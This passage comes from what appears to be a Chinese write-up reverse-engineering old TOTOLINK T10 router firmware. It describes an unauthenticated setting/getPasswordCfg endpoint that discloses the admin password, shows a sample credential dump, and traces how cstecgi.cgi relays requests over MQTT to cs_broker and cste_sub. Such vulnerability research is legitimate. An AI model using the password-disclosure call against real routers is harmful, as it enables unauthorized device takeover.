&amp;quot;www.totolink.cn&amp;quot;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;usbFlag&amp;quot;:	0,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;productName&amp;quot;:	&amp;quot;T10&amp;quot;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;lanIp&amp;quot;:	&amp;quot;192.168.0.1&amp;quot;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;wanConnStatus&amp;quot;:	&amp;quot;disconnected&amp;quot;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;loginUser&amp;quot;:	&amp;quot;admin&amp;quot;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;loginPass&amp;quot;:	&amp;quot;123456888&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514173245584.png&#34; alt=&#34;image-20230514173245584&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;4-2-admin后台&#34;&gt;&lt;a href=&#34;#4-2-admin后台&#34; class=&#34;headerlink&#34; title=&#34;4.2 admin后台&#34;&gt;&lt;/a&gt;4.2 admin后台&lt;/h2&gt;&lt;h3 id=&#34;4-2-1-password-asp&#34;&gt;&lt;a href=&#34;#4-2-1-password-asp&#34; class=&#34;headerlink&#34; title=&#34;4.2.1 password.asp&#34;&gt;&lt;/a&gt;4.2.1 password.asp&lt;/h3&gt;&lt;p&gt;​		通过setting&amp;#x2F;getPasswordCfg接口可以直接获取密码,而且未做鉴权&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var rJson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$(function()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	var postVar=&amp;#123;topicurl:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/getPasswordCfg&amp;quot;&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	postVar=JSON.stringify(postVar);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$.ajax(&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       	type : &lt;span class=&#34;string&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt;, url : &lt;span class=&#34;string&#34;&gt;&amp;quot; /cgi-bin/cstecgi.cgi&amp;quot;&lt;/span&gt;, data : postVar, async : &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;, success : function(Data)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			rJson=JSON.parse(Data);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			supplyValue(&lt;span class=&#34;string&#34;&gt;&amp;quot;admuser&amp;quot;&lt;/span&gt;,rJson[&lt;span class=&#34;string&#34;&gt;&amp;#x27;admuser&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;);		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$(&lt;span class=&#34;string&#34;&gt;&amp;quot;#div_admpass11,#div_admpass21&amp;quot;&lt;/span&gt;).show();&lt;span class=&#34;comment&#34;&gt;//p&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$(&lt;span class=&#34;string&#34;&gt;&amp;quot;#div_admpass12,#div_admpass22&amp;quot;&lt;/span&gt;).hide();&lt;span class=&#34;comment&#34;&gt;//t&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	try&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		parent.frames[&lt;span class=&#34;string&#34;&gt;&amp;quot;title&amp;quot;&lt;/span&gt;].initValue();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;catch(e)&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	&lt;/p&gt;
&lt;h3 id=&#34;4-2-2-所以asp里的功能-是怎么对应到后面的&#34;&gt;&lt;a href=&#34;#4-2-2-所以asp里的功能-是怎么对应到后面的&#34; class=&#34;headerlink&#34; title=&#34;4.2.2 所以asp里的功能 是怎么对应到后面的?&#34;&gt;&lt;/a&gt;4.2.2 所以asp里的功能 是怎么对应到后面的?&lt;/h3&gt;&lt;p&gt;​		答: 通过mqtt协议转发,前端的功能,通过类似于setting&amp;#x2F;getPasswordCfg的消息,发送给代理程序,然后代理程序交给后端服务处理程序来处理,然后再相反路径返回结果&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230513201442154.png&#34; alt=&#34;image-20230513201442154&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4-2-3-客户端如何转发的请求-为什么-x2F-cgi-bin-x2F-cstecgi-cgi里面对应的功能不全呢&#34;&gt;&lt;a href=&#34;#4-2-3-客户端如何转发的请求-为什么-x2F-cgi-bin-x2F-cstecgi-cgi里面对应的功能不全呢&#34; class=&#34;headerlink&#34; title=&#34;4.2.3 客户端如何转发的请求?为什么&amp;#x2F;cgi-bin&amp;#x2F;cstecgi.cgi里面对应的功能不全呢?&#34;&gt;&lt;/a&gt;4.2.3 客户端如何转发的请求?为什么&amp;#x2F;cgi-bin&amp;#x2F;cstecgi.cgi里面对应的功能不全呢?&lt;/h3&gt;&lt;p&gt;​		比如setting&amp;#x2F;getPasswordCfg  它其实是在 system.so里	&lt;/p&gt;
&lt;p&gt;​		答:cstecgi.cgi里并没有包含所有功能,它主要是包含了请求重定向,登陆等功能,其余的功能,会通过转发请求和加载库的机制实现&lt;/p&gt;
&lt;p&gt;在这里匹配不到的最后都会通过else里的这两个函数进行转发请求,给后面的处理程序进行处理. 可以看到,这里转发给了mqtt的代理程序,因为连接到了1883端口.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514100251357.png&#34; alt=&#34;image-20230514100251357&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		web_getData的参数可以往前追溯分析,&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v23 = *(_DWORD *)(cJSON_GetObjectItem(v13, &lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		v23: topicurl的值, 例如setting&amp;#x2F;getPasswordCfg&lt;/p&gt;
&lt;p&gt;​		v30: 其他的参数值&lt;/p&gt;
&lt;p&gt;​		那么这两个函数又是在哪里呢? 搜索发现是在libmosquitto.so库里,它是一个开源的组件,就是由它来负责具体的mqtt消息的处理&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(base) ➜  squashfs-root grep -rin set_CSTEInfo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/libmosquitto.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./web_cste/cgi-bin/cstecgi.cgi matches&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510153255735.png&#34; alt=&#34;image-20230510153255735&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514102745718.png&#34; alt=&#34;image-20230514102745718&#34;&gt;&lt;/p&gt;
&lt;p&gt;v16[0]  0 &lt;/p&gt;
&lt;p&gt;v16[1]  1883 &lt;/p&gt;
&lt;p&gt;v16[2]  127.0.0.1&lt;/p&gt;
&lt;p&gt;v16[3] &lt;/p&gt;
&lt;p&gt;v16[4]  totolink&amp;#x2F;router&amp;#x2F;setting&amp;#x2F;setxxxxCfg&lt;/p&gt;
&lt;p&gt;v16这个数组即发送的请求,传到client_config_load,然后传到  v10 &amp;#x3D; sub_F8DC(a1, a2, a3, a4);&lt;/p&gt;
&lt;p&gt;​		可以看到,它会给消息分配一块堆空间,然后存储到这里&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( mosquitto_sub_topic_check(*(_DWORD *)(a4 + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * (i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))) == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;string&#34;&gt;&amp;quot;Error: Invalid subscription topic &amp;#x27;%s&amp;#x27;, are all &amp;#x27;+&amp;#x27; and &amp;#x27;#&amp;#x27; wildcards correct?\n&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       *(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **)(a4 + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * (i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ++*(_DWORD *)(a1 + &lt;span class=&#34;number&#34;&gt;96&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   *(_DWORD *)(a1 + &lt;span class=&#34;number&#34;&gt;92&lt;/span&gt;) = &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;(*(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; **)(a1 + &lt;span class=&#34;number&#34;&gt;92&lt;/span&gt;), &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * *(_DWORD *)(a1 + &lt;span class=&#34;number&#34;&gt;96&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   v5 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **)(*(_DWORD *)(a1 + &lt;span class=&#34;number&#34;&gt;92&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * (*(_DWORD *)(a1 + &lt;span class=&#34;number&#34;&gt;96&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   *v5 = strdup(*(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **)(a4 + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * (i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;4-2-4-如何加载库的呢&#34;&gt;&lt;a href=&#34;#4-2-4-如何加载库的呢&#34; class=&#34;headerlink&#34; title=&#34;4.2.4 如何加载库的呢?&#34;&gt;&lt;/a&gt;4.2.4 如何加载库的呢?&lt;/h3&gt;&lt;p&gt;​		进行逆向推理,首先要找是谁加载了system.so		&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(base) ➜  squashfs-root grep -irn &lt;span class=&#34;string&#34;&gt;&amp;quot;system.so&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/yddns matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/pppoe-discovery matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/csteDriverConnMachine matches&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		查看了一下这几个文件,发现都没有什么线索,根据网上的资料调查会发现,其实是通过dlopen这个方式加载库,所以.so和system可能进行了拼接,直接搜system就太多了,所以可以搜索路径lib&amp;#x2F;cste_modules&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(base) ➜  squashfs-root grep -irn &lt;span class=&#34;string&#34;&gt;&amp;quot;lib/cste_modules&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/cste_sub matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		所以是cste_sub加载了system,在cute_sub的 &lt;font color=&#34;red&#34;&gt;load_modules()&lt;/font&gt;函数中,找到如下加载库的代码,可以看到,进行了路径拼接,以及用opendir和readdir读取目录中的文件.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514094355795.png&#34; alt=&#34;image-20230514094355795&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tcp        &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1883&lt;/span&gt;            &lt;span class=&#34;number&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;:*               LISTEN      &lt;span class=&#34;number&#34;&gt;1329&lt;/span&gt;/cs_broker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1883&lt;/span&gt;          &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;56383&lt;/span&gt;         ESTABLISHED &lt;span class=&#34;number&#34;&gt;1329&lt;/span&gt;/cs_broker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;56383&lt;/span&gt;         &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1883&lt;/span&gt;          ESTABLISHED &lt;span class=&#34;number&#34;&gt;1335&lt;/span&gt;/cste_sub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		根据前面查到的端口可以进一步分析,首先1883是mqtt端口,cs_broker用了这个端口,所以它就是代理,那么需要找客户端和服务端,客户端很明显,就是&amp;#x2F;cgi-bin&amp;#x2F;cstecgi.cgi,那么服务端呢,也很明显了,就是cste_sub,它与代理始终建立了双向链接&lt;/p&gt;
&lt;h3 id=&#34;4-2-5-cgi-bin-x2F-cstecgi-cgi又是如何把消息传送给cs-broker的呢&#34;&gt;&lt;a href=&#34;#4-2-5-cgi-bin-x2F-cstecgi-cgi又是如何把消息传送给cs-broker的呢&#34; class=&#34;headerlink&#34; title=&#34;4.2.5 cgi-bin&amp;#x2F;cstecgi.cgi又是如何把消息传送给cs_broker的呢?&#34;&gt;&lt;/a&gt;4.2.5 cgi-bin&amp;#x2F;cstecgi.cgi又是如何把消息传送给cs_broker的呢?&lt;/h3&gt;&lt;p&gt;​		在这里与1883代理进行消息转发&lt;/p&gt;
&lt;p&gt;​		&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514170632459.png&#34; alt=&#34;image-20230514170632459&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(base) ➜  squashfs-root grep -irn &lt;span class=&#34;string&#34;&gt;&amp;quot;set_CSTEinfo&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/libmosquitto.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./web_cste/cgi-bin/cstecgi.cgi matches&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		可以发现这两个函数来自于libmosquitto.so这个库,所以说totolink的mqtt是基于这个库来运行的&lt;/p&gt;
&lt;h3 id=&#34;4-2-6-mqtt代理如何和服务端和客户端通信的呢&#34;&gt;&lt;a href=&#34;#4-2-6-mqtt代理如何和服务端和客户端通信的呢&#34; class=&#34;headerlink&#34; title=&#34;4.2.6 mqtt代理如何和服务端和客户端通信的呢?&#34;&gt;&lt;/a&gt;4.2.6 mqtt代理如何和服务端和客户端通信的呢?&lt;/h3&gt;&lt;p&gt;​		也就是说那么 cs_broker是怎么接收cgi-bin&amp;#x2F;cstecgi.cgi的消息的呢? 又是怎么转发消息到cste_sub的呢?&lt;/p&gt;
&lt;h4 id=&#34;4-2-6-1-mqtt代理与客户端通信&#34;&gt;&lt;a href=&#34;#4-2-6-1-mqtt代理与客户端通信&#34; class=&#34;headerlink&#34; title=&#34;4.2.6.1 mqtt代理与客户端通信&#34;&gt;&lt;/a&gt;4.2.6.1 mqtt代理与客户端通信&lt;/h4&gt;&lt;p&gt;​		要有一个listen等待接收消息,cs_broker主函数中的mqtt3_socket_listen函数.获取传来的地址,解析数据,建立socket&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514095808403.png&#34; alt=&#34;image-20230514095808403&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;4-2-6-2-与服务端通信&#34;&gt;&lt;a href=&#34;#4-2-6-2-与服务端通信&#34; class=&#34;headerlink&#34; title=&#34;4.2.6.2 与服务端通信&#34;&gt;&lt;/a&gt;4.2.6.2 与服务端通信&lt;/h4&gt;&lt;p&gt;​		肯定要有一个connect进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514095637378.png&#34; alt=&#34;image-20230514095637378&#34;&gt;	&lt;/p&gt;
&lt;h3 id=&#34;4-2-7-完整的流程&#34;&gt;&lt;a href=&#34;#4-2-7-完整的流程&#34; class=&#34;headerlink&#34; title=&#34;4.2.7 完整的流程&#34;&gt;&lt;/a&gt;4.2.7 完整的流程&lt;/h3&gt;&lt;p&gt;​	分析完登陆和后台的这个功能大概梳理清楚了程序的运行逻辑,它不是直接调用后端的接口,而是通过mqtt通信到后端来处理请求然后返回,所以不论前端的什么请求,都会转化成mqtt的请求包,所以对80端口的请求,也可以通过构造mqtt数据包来执行&lt;/p&gt;
&lt;p&gt;​	此外还分析了一下系统的启动流程等,最后总结成流程图&lt;/p&gt;
